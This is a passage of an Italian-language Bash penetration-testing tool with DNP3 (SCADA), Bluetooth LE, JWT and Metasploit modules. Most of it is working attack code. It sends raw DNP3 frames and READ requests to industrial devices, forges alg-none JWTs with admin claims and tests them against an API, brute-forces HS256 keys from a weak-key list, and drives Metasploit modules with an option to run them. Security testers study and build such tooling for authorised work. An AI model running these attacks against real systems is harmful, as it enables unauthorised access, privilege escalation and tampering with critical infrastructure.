#  MODULO: dnp3 — DNP3 (SCADA/ICS)
# ============================================================
usage_dnp3() {
    echo "Uso: exa-dune dnp3 TARGET [OPTIONS]"
    echo ""
    echo "  Audit DNP3 (SCADA): rilevamento outstation, test accesso non autenticato,"
    echo "  function code scan su porta 20000."
    echo ""
    echo "Opzioni:"
    echo "  --port PORT      Porta DNP3 (default: 20000)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_dnp3() {
    local target="" port=20000
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run) DRY_RUN=1;              shift ;;
            --stealth) STEALTH=1;              shift ;;
            --help|-h) usage_dnp3; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_dnp3; exit 1 ;;
            *)         target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_dnp3; exit 1; }
    validate_target "$target"
    check_root
    setup_outdir "$target" "dnp3"
    log "Target: $target:$port | Output: $OUTDIR"

    section "DNP3 — nmap scan :$port"
    run_cmd "nmap_dnp3" \
        "nmap -p $port --script dnp3-info -sV \
         -oN \"$OUTDIR/nmap_dnp3.nmap\" $target 2>/dev/null"
    if [[ $DRY_RUN -eq 0 ]]; then
        grep -qi "dnp3\|outstation\|master\|DNP" "$OUTDIR/nmap_dnp3.nmap" 2>/dev/null && \
            found HIGH "DNP3:$port — dispositivo SCADA rilevato via nmap"
    fi

    section "DNP3 — Raw probe :$port"
    if [[ $DRY_RUN -eq 0 ]]; then
        if check_port "$target" "$port"; then
            # DNP3 Data Link Layer frame: START=0x0564, LEN=5, CTL=0xC4, DST=1, SRC=4, CRC
            local _dnp3_frame
            _dnp3_frame=$(printf '\x05\x64\x05\xC4\x01\x00\x04\x00\xF3\x53' | \
                timeout 6 nc -w 5 "$target" "$port" 2>/dev/null | xxd | head -5 || true)
            echo "$_dnp3_frame" > "$OUTDIR/dnp3_raw_response.txt"
            if [[ -n "$_dnp3_frame" ]]; then
                found CRITICAL "DNP3:$port — risposta al frame raw (accesso senza autenticazione)"
                # Prova READ request (FC=1) per leggere tutti gli oggetti
                local _dnp3_read
                _dnp3_read=$(printf '\x05\x64\x08\xC4\x01\x00\x04\x00\xC0\xC1\x01\x3C\x01\x06\xFF\xFF' | \
                    timeout 6 nc -w 5 "$target" "$port" 2>/dev/null | xxd | head -10 || true)
                echo "$_dnp3_read" > "$OUTDIR/dnp3_read_response.txt"
                [[ -n "$_dnp3_read" ]] && found CRITICAL "DNP3:$port — READ request accettata (oggetti leggibili)"
            else
                log "DNP3: nessuna risposta al frame raw (porta aperta ma non DNP3 o auth richiesta)"
            fi
        else
            warn "Porta $port chiusa — DNP3 non raggiungibile"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} DNP3 raw frame probe su $target:$port (Data Link Layer + READ request)"
    fi

    ok "DNP3 audit completato → $OUTDIR"
}

# ============================================================
#  MODULO: ble — Bluetooth Low Energy
# ============================================================
usage_ble() {
    echo "Uso: exa-dune ble [OPTIONS]"
    echo ""
    echo "  Scan Bluetooth Low Energy: rileva dispositivi nell'area,"
    echo "  enumera servizi GATT, identifica IoT/dispositivi noti."
    echo ""
    echo "Opzioni:"
    echo "  --iface IFACE    Interfaccia BT (default: hci0)"
    echo "  --timeout N      Durata scan in secondi (default: 15)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_ble() {
    local iface="hci0" scan_timeout=15
    # BLE non richiede TARGET (scan passivo)
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --iface)   _req_arg "$1" "${2:-}"; iface="$2";       shift 2 ;;
            --timeout) _req_arg "$1" "${2:-}"; scan_timeout="$2"; shift 2 ;;
            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run) DRY_RUN=1;              shift ;;
            --help|-h) usage_ble; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_ble; exit 1 ;;
            *)         shift ;; # ignora argomenti posizionali
        esac
    done
    check_root
    # Setup directory output senza target
    local _ble_out="${OUTDIR_BASE:-/root/pentest/ble_$(date +%Y%m%d_%H%M%S)}"
    mkdir -p "$_ble_out"
    log "BLE scan su $iface | Output: $_ble_out"

    section "BLE — Verifica adapter"
    if [[ $DRY_RUN -eq 0 ]]; then
        if ! command -v hciconfig &>/dev/null && ! command -v bluetoothctl &>/dev/null; then
            warn "hciconfig/bluetoothctl non trovati — installa: apt install bluez"
            ok "BLE scan saltato"; return
        fi
        local _hci_info
        _hci_info=$(hciconfig "$iface" 2>/dev/null || true)
        echo "$_hci_info" > "$_ble_out/hci_info.txt"
        if ! echo "$_hci_info" | grep -qi "UP RUNNING\|RUNNING"; then
            warn "Adapter $iface non attivo — provo ad attivarlo..."
            hciconfig "$iface" up 2>/dev/null || true
        fi
        log "Adapter: $(echo "$_hci_info" | grep -oP 'BD Address: \K\S+' | head -1 || echo 'n/d')"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} hciconfig $iface up && hcitool lescan --passive (${scan_timeout}s)"
        return
    fi

    section "BLE — Scan passivo (${scan_timeout}s)"
    local _ble_scan_file="$_ble_out/ble_scan.txt"
    timeout "$scan_timeout" hcitool -i "$iface" lescan --passive 2>/dev/null \
        > "$_ble_scan_file" || true
    local _dev_count
    _dev_count=$(grep -cE '^([0-9A-F]{2}:){5}[0-9A-F]{2}' "$_ble_scan_file" 2>/dev/null || echo 0)
    if [[ "$_dev_count" -gt 0 ]]; then
        found HIGH "BLE — $_dev_count dispositivo/i Bluetooth Low Energy nel range"
        grep -E '^([0-9A-F]{2}:){5}[0-9A-F]{2}' "$_ble_scan_file" | sort -u | \
            head -20 > "$_ble_out/ble_devices.txt"

        section "BLE — Info dispositivi"
        while IFS= read -r _dev_line; do
            local _addr _name
            _addr=$(echo "$_dev_line" | awk '{print $1}')
            _name=$(echo "$_dev_line" | cut -d' ' -f2- | tr -d '\r\n' || true)
            log "  Dispositivo: $_addr ${_name:+(${_name})}"
            # Info device
            hcitool -i "$iface" info "$_addr" 2>/dev/null \
                >> "$_ble_out/ble_device_info.txt" || true
            # GATT services enumeration con gatttool
            if command -v gatttool &>/dev/null; then
                timeout 10 gatttool -b "$_addr" --primary 2>/dev/null \
                    >> "$_ble_out/gatt_${_addr//:/_}.txt" || true
                if [[ -s "$_ble_out/gatt_${_addr//:/_}.txt" ]]; then
                    found MEDIUM "BLE GATT — servizi enumerati su $_addr"
                    local _srv_count
                    _srv_count=$(wc -l < "$_ble_out/gatt_${_addr//:/_}.txt" || echo 0)
                    log "    GATT: $_srv_count servizi"
                fi
            fi
        done < "$_ble_out/ble_devices.txt"
    else
        log "BLE: nessun dispositivo rilevato nel range"
    fi

    section "BLE — bluetoothctl scan"
    if command -v bluetoothctl &>/dev/null; then
        # Scan con bluetoothctl
        timeout "$scan_timeout" bluetoothctl -- scan on 2>/dev/null | \
            grep -E "Device|NEW|Controller" > "$_ble_out/bluetoothctl_scan.txt" || true
        grep -c "NEW\|Device" "$_ble_out/bluetoothctl_scan.txt" 2>/dev/null | \
            read -r _bctl_count || _bctl_count=0
        [[ "${_bctl_count:-0}" -gt 0 ]] && \
            found MEDIUM "BLE bluetoothctl — $_bctl_count entry rilevate"
    fi

    ok "BLE scan completato → $_ble_out"
}

# ============================================================
#  MODULO: jwt — JWT Attack
# ============================================================
usage_jwt() {
    echo "Uso: exa-dune jwt TARGET [OPTIONS]"
    echo ""
    echo "  Cerca e attacca JWT: algoritmo 'none', chiavi HS256 deboli,"
    echo "  confusione RS256→HS256, claim injection."
    echo ""
    echo "Opzioni:"
    echo "  --port PORT      Porta HTTP (default: 80)"
    echo "  --scheme SCHEME  http|https (default: http)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_jwt() {
    local target="" port=80 scheme="http"
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
            --scheme)  _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run) DRY_RUN=1;              shift ;;
            --stealth) STEALTH=1;              shift ;;
            --help|-h) usage_jwt; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_jwt; exit 1 ;;
            *)         target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_jwt; exit 1; }
    validate_target "$target"
    check_root
    setup_outdir "$target" "jwt"
    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"

    local base_url="${scheme}://${target}:${port}"
    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"

    section "JWT — Ricerca token nelle risposte HTTP"
    local _jwt_found=""
    if [[ $DRY_RUN -eq 0 ]]; then
        # Cerca JWT in risposta root e endpoint comuni
        local -a _endpoints=("/" "/api" "/api/v1" "/api/v2" "/auth" "/login" "/token" "/health")
        for _ep in "${_endpoints[@]}"; do
            local _resp _hdrs
            _resp=$(curl -s $insecure --max-time 8 -D "$OUTDIR/headers_${_ep//\//_}.txt" \
                "${base_url}${_ep}" 2>/dev/null || true)
            _hdrs=$(cat "$OUTDIR/headers_${_ep//\//_}.txt" 2>/dev/null || true)
            # Cerca JWT in header (Authorization, Set-Cookie) e body
            local _jwt_candidate
            _jwt_candidate=$(echo "${_resp}${_hdrs}" | \
                grep -oP 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' | head -3 || true)
            if [[ -n "$_jwt_candidate" ]]; then
                _jwt_found="$_jwt_candidate"
                echo "$_jwt_candidate" >> "$OUTDIR/jwt_tokens_found.txt"
                found MEDIUM "JWT trovato su ${_ep}"
                log "  JWT (prime 50 char): ${_jwt_candidate:0:50}..."
                # Controlla se JWT su HTTP (non HTTPS)
                [[ "$scheme" == "http" ]] && \
                    found HIGH "JWT trasmesso su HTTP non cifrato"
            fi
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} JWT search su ${#_endpoints[@]} endpoint di $base_url"
        return
    fi

    if [[ -z "$_jwt_found" ]]; then
        log "JWT: nessun token trovato nelle risposte HTTP"
        ok "JWT audit completato → $OUTDIR"; return
    fi

    section "JWT — Decode e analisi claims"
    local _jwt="$_jwt_found"
    if [[ $DRY_RUN -eq 0 ]]; then
        EXA_JWT_TOKEN="$_jwt" python3 - <<'PYEOF' 2>/dev/null >> "$OUTDIR/jwt_decoded.txt" || true
import os, base64, json
token = os.environ.get('EXA_JWT_TOKEN', '')
parts = token.split('.')
if len(parts) >= 2:
    for i, part in enumerate(parts[:2]):
        pad = 4 - len(part) % 4
        part += '=' * (pad % 4)
        try:
            decoded = json.loads(base64.urlsafe_b64decode(part))
            print(f"Part {i} ({'header' if i==0 else 'payload'}): {json.dumps(decoded, indent=2)}")
        except Exception as e:
            print(f"Part {i}: decode error: {e}")
PYEOF
        if [[ -s "$OUTDIR/jwt_decoded.txt" ]]; then
            log "JWT claims:"
            cat "$OUTDIR/jwt_decoded.txt" | head -20 | while IFS= read -r _l; do log "  $_l"; done || true
            # Controlla algoritmo
            grep -qi '"alg".*"none"' "$OUTDIR/jwt_decoded.txt" 2>/dev/null && \
                found CRITICAL "JWT — algoritmo 'none' nel token (firma bypassata)"
            grep -qi '"alg".*"HS256"' "$OUTDIR/jwt_decoded.txt" 2>/dev/null && \
                log "  Algoritmo: HS256 (testare chiave debole)"
        fi
    fi

    section "JWT — Test algoritmo 'none'"
    if [[ $DRY_RUN -eq 0 ]]; then
        EXA_JWT_TOKEN="$_jwt" python3 - <<'PYEOF' 2>/dev/null > "$OUTDIR/jwt_none_token.txt" || true
import os, base64, json
token = os.environ.get('EXA_JWT_TOKEN', '')
parts = token.split('.')
if len(parts) >= 2:
    try:
        hdr_raw = parts[0] + '=' * (4 - len(parts[0]) % 4 % 4)
        hdr = json.loads(base64.urlsafe_b64decode(hdr_raw))
        hdr['alg'] = 'none'
        new_hdr = base64.urlsafe_b64encode(json.dumps(hdr, separators=(',', ':')).encode()).rstrip(b'=').decode()
        pld_raw = parts[1] + '=' * (4 - len(parts[1]) % 4 % 4)
        pld = json.loads(base64.urlsafe_b64decode(pld_raw))
        # Modifica claim per escalation
        if 'role' in pld: pld['role'] = 'admin'
        if 'admin' in pld: pld['admin'] = True
        if 'is_admin' in pld: pld['is_admin'] = True
        new_pld = base64.urlsafe_b64encode(json.dumps(pld, separators=(',', ':')).encode()).rstrip(b'=').decode()
        print(f"{new_hdr}.{new_pld}.")
    except Exception as e:
        print(f"error: {e}")
PYEOF
        local _none_token; _none_token=$(cat "$OUTDIR/jwt_none_token.txt" 2>/dev/null || true)
        if [[ -n "$_none_token" ]] && ! echo "$_none_token" | grep -qi "error"; then
            # Testa il token modificato
            local _none_resp _none_code
            _none_code=$(curl -s $insecure -o /dev/null -w "%{http_code}" --max-time 5 \
                -H "Authorization: Bearer ${_none_token}" \
                "${base_url}/api/v1/users" 2>/dev/null || echo "000")
            if [[ "$_none_code" == "200" ]]; then
                found CRITICAL "JWT — algoritmo 'none' accettato! Escalation privilege riuscita"
            fi
        fi
    fi

    section "JWT — Brute-force chiave HS256"
    if [[ $DRY_RUN -eq 0 ]]; then
        local -a _weak_keys=("secret" "password" "123456" "key" "jwt" "jwt_secret"
                              "supersecret" "changeme" "mysecret" "token" "auth"
                              "$target" "admin" "1234567890" "qwerty" "letmein")
        for _k in "${_weak_keys[@]}"; do
            EXA_JWT_TOKEN="$_jwt" EXA_JWT_KEY="$_k" python3 - <<'PYEOF' 2>/dev/null \
                > "$OUTDIR/jwt_bruteforce_result.txt" || true
import os, hmac, hashlib, base64
token = os.environ.get('EXA_JWT_TOKEN', '')
key = os.environ.get('EXA_JWT_KEY', '')
parts = token.split('.')
if len(parts) >= 3 and parts[2]:
    msg = f"{parts[0]}.{parts[1]}".encode()
    sig = hmac.new(key.encode(), msg, hashlib.sha256).digest()
    b64sig = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
    if b64sig == parts[2]:
        print(f"FOUND key={key}")
    else:
        print(f"no key={key}")
PYEOF
            if grep -qi "FOUND" "$OUTDIR/jwt_bruteforce_result.txt" 2>/dev/null; then
                found CRITICAL "JWT — chiave HS256 debole trovata: '${_k}'"
                break
            fi
        done
    fi

    ok "JWT audit completato → $OUTDIR"
}

# ============================================================
#  MODULO: msf — Metasploit Integration
# ============================================================
usage_msf() {
    echo "Uso: exa-dune msf TARGET [OPTIONS]"
    echo ""
    echo "  Wrapper Metasploit: esegue 'check' sui moduli auxiliary più rilevanti"
    echo "  in base alle porte aperte. Non esegue exploit — solo verifica."
    echo ""
    echo "Opzioni:"
    echo "  --ports LIST     Porte aperte separate da spazi (es: '22 80 445')"
    echo "  --exploit        Esegui exploit (default: solo check)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_msf() {
    local target="" open_ports_arg="" do_exploit=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --ports)   _req_arg "$1" "${2:-}"; open_ports_arg="$2"; shift 2 ;;
            --exploit) do_exploit=1;            shift ;;
            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run) DRY_RUN=1;              shift ;;
            --stealth) STEALTH=1;              shift ;;
            --help|-h) usage_msf; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_msf; exit 1 ;;
            *)         target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_msf; exit 1; }
    validate_target "$target"
    check_root
    setup_outdir "$target" "msf"
    log "Target: $target | Output: $OUTDIR"

    if ! command -v msfconsole &>/dev/null; then
        warn "msfconsole non trovato — installa: apt install metasploit-framework"
        ok "MSF audit saltato"; return
    fi

    # Mappa porta → modulo auxiliary MSF
    declare -A _port_module_map=(
        [445]="auxiliary/scanner/smb/smb_ms17_010"
        [3389]="auxiliary/scanner/rdp/ms12_020_maxchannelids"
        [5900]="auxiliary/scanner/vnc/vnc_none_auth"
        [6379]="auxiliary/scanner/redis/redis_login"
        [1883]="auxiliary/scanner/mqtt/connect"
        [623]="auxiliary/scanner/ipmi/ipmi_cipher_zero"
        [5060]="auxiliary/scanner/sip/options_tcp"
        [21]="auxiliary/scanner/ftp/anonymous"
        [23]="auxiliary/scanner/telnet/telnet_login"
        [161]="auxiliary/scanner/snmp/snmp_login"
        [2049]="auxiliary/scanner/nfs/nfsmount"
        [8080]="auxiliary/scanner/http/http_login"
        [80]="auxiliary/scanner/http/http_login"
    )

    # Costruisce RC script con moduli rilevanti
    local _rc_file="$OUTDIR/msf_check.rc"
    {
        echo "spool $OUTDIR/msf_output.txt"
        local _mod_count=0
        for _p in ${open_ports_arg:-445 80 21 23 161 5900 6379 1883 3389 623 5060}; do
            local _mod="${_port_module_map[$_p]:-}"
            [[ -z "$_mod" ]] && continue
            echo "use $_mod"
            echo "set RHOSTS $target"
            echo "set RPORT $_p"
            echo "set ConnectTimeout 8"
            echo "set THREADS 1"
            if [[ $do_exploit -eq 1 ]]; then
                echo "run"
            else
                echo "check"
            fi
            echo "back"
            ((_mod_count++)) || true
        done
        echo "exit"
    } > "$_rc_file"

    section "Metasploit — $(grep -c '^use ' "$_rc_file" 2>/dev/null || echo 0) moduli auxiliary"
    if [[ $DRY_RUN -eq 0 ]]; then
        log "Esecuzione msfconsole (timeout 5 min)..."
        timeout 300 msfconsole -q -r "$_rc_file" > /dev/null 2>&1 || true

        if [[ -s "$OUTDIR/msf_output.txt" ]]; then
            # Analizza output
            grep -iE "appears to be vulnerable|is vulnerable|\[\+\].*success|login success" \
                "$OUTDIR/msf_output.txt" 2>/dev/null | \
                while IFS= read -r _l; do
                    found CRITICAL "Metasploit: $_l"
                done || true
            grep -iE "\[!\].*not vulnerable|check failed" "$OUTDIR/msf_output.txt" 2>/dev/null | \
                head -5 | while IFS= read -r _l; do log "  $_l"; done || true
            local _vuln_count
            _vuln_count=$(grep -ciE "vulnerable|success" "$OUTDIR/msf_output.txt" 2>/dev/null || echo 0)
            log "MSF check completato — $vuln_count risultati positivi"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} msfconsole -r $OUTDIR/msf_check.rc (check su porte: $open_ports_arg)"
    fi

    ok "MSF audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: completion
